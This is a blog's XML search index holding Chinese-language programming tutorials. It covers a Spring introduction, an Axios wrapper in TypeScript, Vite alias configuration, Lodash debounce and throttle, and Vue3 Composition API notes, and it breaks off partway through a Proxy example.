<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Spring</title>
      <link href="/2022/04/11/Spring/"/>
      <url>/2022/04/11/Spring/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Spring 是 Java EE 编程领域的一款轻量级的开源框架，由被称为“Spring 之父”的 Rod Johnson 于 2002 年提出并创立，它的目标就是要简化 Java 企业级应用程序的开发难度和周期。</p><p>Spring 自诞生以来备受青睐，一直被广大开发人员作为 Java 企业级应用程序开发的首选。时至今日，Spring 俨然成为了 Java EE 代名词，成为了构建 Java EE 应用的事实标准。</p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>核心技术：依赖关系注入，事件，资源，i18n，验证，数据绑定，类型转换，SpEL，AOP。</li><li>测试： 模拟对象， TestContext 框架， Spring MVC Test， .<code>WebTestClient</code></li><li>数据访问：事务、DAO 支持、JDBC、ORM、编组 XML。</li><li>春季 MVC和弹簧卷筒纸网络框架。</li><li>集成：远程处理、JMS、JCA、JMX、电子邮件、任务、调度、缓存。</li><li>语言：Kotlin，Groovy，动态语言。</li></ul><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ul><li>Spring是一个开源的免费的框架</li><li>Spring是一个轻量级、非入侵的框架</li><li>控制反转(IOC), 面向切面编程(AOP)</li><li>支持事务的处理， 对框架整合的支持</li></ul><blockquote><p>总结：Spring是一个轻量级的控制反转(IOC) 和面向且切面编程(AOP) 的框架</p></blockquote><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202204112206352.png"></p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面向对象TS封装Axios</title>
      <link href="/2022/03/25/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1TS%E4%BA%8C%E6%AC%A1%E5%B0%81%E8%A3%85Axios/"/>
      <url>/2022/03/25/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1TS%E4%BA%8C%E6%AC%A1%E5%B0%81%E8%A3%85Axios/</url>
      
        <content type="html"><![CDATA[<h1 id="面向对象TS封装Axios"><a href="#面向对象TS封装Axios" class="headerlink" title="面向对象TS封装Axios"></a>面向对象TS封装Axios</h1><h1 id="封装axios"><a href="#封装axios" class="headerlink" title="封装axios"></a>封装axios</h1><p>request.ts</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">import axios, &#123;AxiosRequestConfig, AxiosResponse, AxiosInstance, AxiosStatic&#125; from &#x27;axios&#x27;;</span><br><span class="line"></span><br><span class="line">class AxiosUtilt&#123;</span><br><span class="line">    public requests: AxiosInstance;</span><br><span class="line">    </span><br><span class="line">    constructor(axios: AxiosStatic)&#123;</span><br><span class="line">      this.requests = axios.create(&#123;</span><br><span class="line">        timeout: 5000</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取请求拦截器</span><br><span class="line">     * @param requests </span><br><span class="line">     */</span><br><span class="line">    requestInterceptors(requests: AxiosInstance) &#123;</span><br><span class="line">      this.requests.interceptors.request.use(</span><br><span class="line">        (config: AxiosRequestConfig)=&gt;&#123;</span><br><span class="line">          //加载</span><br><span class="line">          startLoading()</span><br><span class="line">          console.log(&#x27;我是拦截器,请求发送成功&#x27;);</span><br><span class="line">          return config</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 获取响应拦截器</span><br><span class="line">     * @param requests </span><br><span class="line">     */</span><br><span class="line">    responseInterceptors(requests: AxiosInstance)&#123;</span><br><span class="line">      requests.interceptors.response.use(</span><br><span class="line">        (response: AxiosResponse)=&gt;&#123;</span><br><span class="line">          // 结束</span><br><span class="line">        </span><br><span class="line">          console.log(&#x27;我是拦截器，获取响应成功&#x27;);</span><br><span class="line"></span><br><span class="line">          return response</span><br><span class="line">        &#125;,</span><br><span class="line">        (error: any)=&gt;&#123;</span><br><span class="line">          endloading()</span><br><span class="line">          return Promise.reject(new Error(&#x27;file&#x27;))</span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * </span><br><span class="line">     * @returns 获取axios实例对象</span><br><span class="line">     */</span><br><span class="line">    getRequest()&#123;</span><br><span class="line">      this.requestInterceptors(this.requests)</span><br><span class="line">      this.responseInterceptors(this.requests)</span><br><span class="line">      return this.requests</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 暴露axios</span><br><span class="line"> */</span><br><span class="line">export default new AxiosUtilt(axios).getRequest() </span><br></pre></td></tr></table></figure><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>封装好后让我们发个请求使用一下</p><p>index.ts</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import request from &#x27;./request&#x27;;</span><br><span class="line"></span><br><span class="line">export const getData = ()=&gt; request.get(&#x27;https://yxcr-music-api.vercel.app/homepage/dragon/ball&#x27;)</span><br></pre></td></tr></table></figure><p>app.vue</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">onMounted( <span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;我挂载好了&#x27;</span>);</span><br><span class="line">        getData().then(</span><br><span class="line">            <span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&#x27;成功&#x27;</span>,res);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&#x27;失败&#x27;</span>, error);</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">    &#125; ) </span><br></pre></td></tr></table></figure><p>查看浏览器返回</p><p><code>成功的情况下</code></p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我挂载好了</span><br><span class="line">request.ts:<span class="number">43</span> 我是拦截器,请求发送成功</span><br><span class="line"></span><br><span class="line">我是拦截器,获取响应成功</span><br><span class="line">App.vue:<span class="number">15</span> 成功 &#123;data: &#123;…&#125;, status: <span class="number">200</span>, statusText: &#x27;&#x27;, headers: &#123;…&#125;, config: &#123;…&#125;, …&#125;</span><br></pre></td></tr></table></figure><p><code>失败的情况下</code></p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我挂载好了</span><br><span class="line">request.ts:<span class="number">43</span> 我是拦截器,请求发送成功</span><br><span class="line"></span><br><span class="line">失败 Error: <span class="keyword">file</span></span><br><span class="line">    at request.ts:<span class="number">63</span>:<span class="number">33</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Axios </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vite中alias别名配置</title>
      <link href="/2022/03/24/vite%E4%B8%ADalias%E5%88%AB%E5%90%8D%E9%85%8D%E7%BD%AE/"/>
      <url>/2022/03/24/vite%E4%B8%ADalias%E5%88%AB%E5%90%8D%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="alias别名配置"><a href="#alias别名配置" class="headerlink" title="alias别名配置"></a>alias别名配置</h1><ol><li><p>导入路径</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; resolve &#125; <span class="keyword">from</span> <span class="string">&#x27;path&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>添加配置</p><p>views、comp、css表示别名</p><p>后面的表示别名的路径</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">resolve: &#123;</span><br><span class="line">  <span class="attr">alias</span>:&#123;</span><br><span class="line">    <span class="attr">views</span>:resolve(__dirname,<span class="string">&#x27;./src/views&#x27;</span>),</span><br><span class="line">    <span class="attr">comp</span>:resolve(__dirname,<span class="string">&#x27;./src/components&#x27;</span>),</span><br><span class="line">    <span class="attr">css</span>:<span class="string">&#x27;/public/css&#x27;</span>, <span class="comment">// 静态资源</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li></ol><p>vite.config.ts</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import &#123; defineConfig &#125; from &#x27;vite&#x27;</span><br><span class="line">import vue from &#x27;@vitejs/plugin-vue&#x27;</span><br><span class="line">import &#123; resolve &#125; from &#x27;path&#x27;</span><br><span class="line">// https://vitejs.dev/config/</span><br><span class="line">export default defineConfig(&#123;</span><br><span class="line">  plugins: [vue()],</span><br><span class="line">  resolve: &#123;</span><br><span class="line">    alias:&#123;</span><br><span class="line">      views:resolve(__dirname,&#x27;./src/views&#x27;),</span><br><span class="line">      comp:resolve(__dirname,&#x27;./src/components&#x27;),</span><br><span class="line">      css:&#x27;/public/css&#x27;,</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Lodash防抖节流</title>
      <link href="/2022/03/23/Lodash%E9%98%B2%E6%8A%96%E8%8A%82%E6%B5%81%E5%A4%84%E7%90%86/"/>
      <url>/2022/03/23/Lodash%E9%98%B2%E6%8A%96%E8%8A%82%E6%B5%81%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="防抖节流"><a href="#防抖节流" class="headerlink" title="防抖节流"></a>防抖节流</h1><p>Debounce，又称防抖动函数， 常被被用来控制 前端异步请求及其它高耗任务的频率</p><p>使用按需引入的方式</p><p>安装lodash</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install lodash</span><br></pre></td></tr></table></figure><p>导入函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> _ <span class="keyword">from</span> <span class="string">&quot;lodash&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="防抖函数debounce"><a href="#防抖函数debounce" class="headerlink" title="防抖函数debounce"></a>防抖函数debounce</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> input = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;input&#x27;</span>)</span><br><span class="line"><span class="comment">// 文本发生变化它会立即执行</span></span><br><span class="line">input.oninput = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;我在变化&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用防抖</span></span><br><span class="line"><span class="keyword">let</span> input = _.debounce(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;我在一秒钟后才执行&#x27;</span>)</span><br><span class="line">&#125;， <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="节流函数throttle"><a href="#节流函数throttle" class="headerlink" title="节流函数throttle"></a>节流函数throttle</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mouseHandler = <span class="function">(<span class="params">flag</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;进来&#x27;</span>);</span><br><span class="line">            bgColor.value = <span class="string">&#x27;pink&#x27;</span></span><br><span class="line">            myColor.value = <span class="string">&#x27;green&#x27;</span></span><br><span class="line">            isShow.value = <span class="literal">true</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;出去&#x27;</span>);</span><br><span class="line">            bgColor.value = <span class="string">&#x27;white&#x27;</span></span><br><span class="line">            myColor.value = <span class="string">&#x27;black&#x27;</span></span><br><span class="line">            isShow.value = <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用防抖</span></span><br><span class="line"><span class="keyword">const</span> mouseHandler = _.throttle(<span class="function"><span class="keyword">function</span>(<span class="params">flag</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;进来&#x27;</span>);</span><br><span class="line">            bgColor.value = <span class="string">&#x27;pink&#x27;</span></span><br><span class="line">            myColor.value = <span class="string">&#x27;green&#x27;</span></span><br><span class="line">            isShow.value = <span class="literal">true</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;出去&#x27;</span>);</span><br><span class="line">            bgColor.value = <span class="string">&#x27;white&#x27;</span></span><br><span class="line">            myColor.value = <span class="string">&#x27;black&#x27;</span></span><br><span class="line">            isShow.value = <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">50</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue3</title>
      <link href="/2022/03/21/Vue3/"/>
      <url>/2022/03/21/Vue3/</url>
      
        <content type="html"><![CDATA[<h1 id="Vue3对比Vue2"><a href="#Vue3对比Vue2" class="headerlink" title="Vue3对比Vue2"></a>Vue3对比Vue2</h1><h2 id="相关信息"><a href="#相关信息" class="headerlink" title="相关信息"></a>相关信息</h2><p>Vue.js 3.0 “One Piece” 正式版在今年9月份发布</p><p>2年多开发, 100+位贡献者, 2600+次提交, 600+次PR</p><p><strong>Vue3支持vue2的大多数特性</strong></p><p><strong>更好的支持Typescript</strong></p><h2 id="性能提升"><a href="#性能提升" class="headerlink" title="性能提升"></a>性能提升</h2><p>打包大小减少41%</p><p>初次渲染快55%, 更新渲染快133%</p><p>内存减少54%</p><p><strong>使用Proxy代替defineProperty实现数据响应式</strong></p><p><strong>重写虚拟DOM的实现和Tree-Shaking</strong></p><h2 id="新增特性"><a href="#新增特性" class="headerlink" title="新增特性"></a>新增特性</h2><ul><li><p><strong>Composition (组合) API</strong></p></li><li><p>setup</p><ul><li>ref 和 reactive</li><li>computed 和 watch</li><li>新的生命周期函数</li><li>provide与inject</li></ul></li><li><p>新组件</p><ul><li>Fragment - 文档碎片</li><li>Teleport - 瞬移组件的位置</li><li>Suspense - 异步加载组件的loading界面</li></ul></li><li><p>其它API更新</p><ul><li>全局API的修改</li><li>将原来的全局API转移到应用对象</li><li>模板语法变化</li></ul></li></ul><h1 id="创建vue3项目"><a href="#创建vue3项目" class="headerlink" title="创建vue3项目"></a>创建vue3项目</h1><h2 id="使用-vue-cli-创建"><a href="#使用-vue-cli-创建" class="headerlink" title="使用 vue-cli 创建"></a>使用 vue-cli 创建</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 安装或者升级</span></span><br><span class="line">npm install -g @vue/cli</span><br><span class="line"><span class="comment">## 保证 vue cli 版本在 4.5.0 以上</span></span><br><span class="line">vue --version</span><br><span class="line"><span class="comment">## 创建项目</span></span><br><span class="line">vue create my-project</span><br></pre></td></tr></table></figure><h2 id="使用-vite-创建"><a href="#使用-vite-创建" class="headerlink" title="使用 vite 创建"></a>使用 vite 创建</h2><ul><li>vite 是一个由原生 ESM 驱动的 Web 开发构建工具。在开发环境下基于浏览器原生 ES imports 开发，</li><li>它做到了<em><strong>本地快速开发启动</strong></em>, 在生产环境下基于 Rollup 打包。<ul><li>快速的冷启动，不需要等待打包操作；</li><li>即时的热模块更新，替换性能和模块数量的解耦让更新飞起；</li><li>真正的按需编译，不再等待整个应用编译完成，这是一个巨大的改变</li></ul></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm init vite-app &lt;project-name&gt;</span><br><span class="line"><span class="built_in">cd</span> &lt;project-name&gt;</span><br><span class="line">npm install</span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure><h1 id="Composition-API"><a href="#Composition-API" class="headerlink" title="Composition API"></a>Composition API</h1><h2 id="setup"><a href="#setup" class="headerlink" title="setup"></a>setup</h2><ul><li>新的option, 所有的组合API函数都在此使用, 只在初始化时执行一次</li><li>函数如果返回对象, 对象中的属性或方法, 模板中可以直接使用</li></ul><p>ref 是一个函数，作用：定义一个响应式数据，返回的是一个ref对象，对象中有个value属性，如果需要对数据进行操作，需要使用该ref对象调用value属性的方式进行数据的操作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setup () &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><ul><li>作用: 定义一个数据的响应式</li><li>语法: const xxx = ref(initValue):<ul><li>创建一个包含响应式数据的引用(reference)对象</li><li>js中操作数据: xxx.value</li><li>模板中操作数据: 不需要.value</li></ul></li><li>一般用来定义一个基本类型的响应式数据</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h2&gt;&#123;&#123;count&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">  &lt;button @click=&quot;update&quot;&gt;更新&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import &#123;</span><br><span class="line">  ref</span><br><span class="line">&#125; from &#x27;vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line"></span><br><span class="line">  /* 在Vue3中依然可以使用data和methods配置, 但建议使用其新语法实现 */</span><br><span class="line">  // data () &#123;</span><br><span class="line">  //   return &#123;</span><br><span class="line">  //     count: 0</span><br><span class="line">  //   &#125;</span><br><span class="line">  // &#125;,</span><br><span class="line">  // methods: &#123;</span><br><span class="line">  //   update () &#123;</span><br><span class="line">  //     this.count++</span><br><span class="line">  //   &#125;</span><br><span class="line">  // &#125;</span><br><span class="line"></span><br><span class="line">  /* 使用vue3的composition API */</span><br><span class="line">  setup () &#123;</span><br><span class="line"></span><br><span class="line">    // 定义响应式数据 ref对象</span><br><span class="line">    const count = ref(1)</span><br><span class="line">    console.log(count)</span><br><span class="line"></span><br><span class="line">    // 更新响应式数据的函数</span><br><span class="line">    function update () &#123;</span><br><span class="line">      // alert(&#x27;update&#x27;)</span><br><span class="line">      count.value = count.value + 1</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      count,</span><br><span class="line">      update</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="reactive"><a href="#reactive" class="headerlink" title="reactive"></a>reactive</h2><ul><li>作用: 定义多个数据的响应式</li><li>const proxy = reactive(obj): 接收一个普通对象然后返回该普通对象的响应式代理器对象</li><li>响应式转换是“深层的”：会影响对象内部所有嵌套的属性</li><li>内部基于 ES6 的 Proxy 实现，通过代理对象操作源对象内部数据都是响应式的</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h1&gt;姓名：&#123;&#123;user.name&#125;&#125;&lt;/h1&gt;</span><br><span class="line">  &lt;h1&gt;年龄:&#123;&#123;user.age&#125;&#125;&lt;/h1&gt;</span><br><span class="line">  &lt;h1&gt;lp:&#123;&#123;user.wife&#125;&#125;&lt;/h1&gt;</span><br><span class="line">  &lt;button @click=&quot;updataCar&quot;&gt;更新数据&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&#x27;ts&#x27;&gt;</span><br><span class="line">import &#123;defineComponent, reactive&#125; from &#x27;vue&#x27;;</span><br><span class="line">export default defineComponent(&#123;</span><br><span class="line">  name: &#x27;App&#x27;,</span><br><span class="line">  // 显示用户的相关信息，点击按钮，可以更新用户的相关信息数据</span><br><span class="line">  setup() &#123;</span><br><span class="line">    /**</span><br><span class="line">     * reactive</span><br><span class="line">     * 作用: 定义多个数据的响应式</span><br><span class="line">     * const proxy = reactive(obj) 接收一个普通对象然后返回该普通对象的响应式代理器对象</span><br><span class="line">     * 响应式转换时深层的会影响对象内部所有嵌套的属性</span><br><span class="line">     * 内部基于ES6的proxy实现，通过代理对象操作源对象内部数据都是响应式的</span><br><span class="line">     */</span><br><span class="line">   const user = reactive(&#123;</span><br><span class="line">     name: &#x27;小明&#x27;,</span><br><span class="line">     age: 20,</span><br><span class="line">     wife:&#123;</span><br><span class="line">       name: &#x27;小红&#x27;,</span><br><span class="line">       age: 18, </span><br><span class="line">       cars: [&#x27;奔驰&#x27;, &#x27;宝马&#x27;, &#x27;捷豹&#x27;]</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;)</span><br><span class="line">    /**</span><br><span class="line">     * 把数据变成响应式的数据</span><br><span class="line">     * 返回的是一个proxy的代理对象，被代理的目标对象就是obj对象</span><br><span class="line">     * user现在是代理对象， obj 是目标对象</span><br><span class="line">     */</span><br><span class="line">    const users = reactive(user)</span><br><span class="line">    console.log(users);</span><br><span class="line">   const updataCar = ()=&gt;&#123;</span><br><span class="line">     user.name = &#x27;小马&#x27;</span><br><span class="line">     user.age = 19</span><br><span class="line">     user.wife.name = &#x27;小妹&#x27;</span><br><span class="line">     user.wife.cars[0] = &#x27;雅阁&#x27;</span><br><span class="line">   &#125;</span><br><span class="line">   return&#123;</span><br><span class="line">     user, updataCar</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="比较Vue2与Vue3的响应式"><a href="#比较Vue2与Vue3的响应式" class="headerlink" title="比较Vue2与Vue3的响应式"></a>比较Vue2与Vue3的响应式</h1><h2 id="Vue3的响应式"><a href="#Vue3的响应式" class="headerlink" title="Vue3的响应式"></a>Vue3的响应式</h2><p>核心:</p><ul><li>通过Proxy(代理): 拦截对data任意属性的任意(13种)操作, 包括属性值的读写, 属性的添加, 属性的删除等…</li><li>通过 Reflect(反射): 动态对被代理对象的相应属性进行特定的操作</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Proxy</span>(data, &#123;</span><br><span class="line"><span class="comment">// 拦截读取属性值</span></span><br><span class="line">    get (target, prop) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.get(target, prop)</span><br><span class="line">    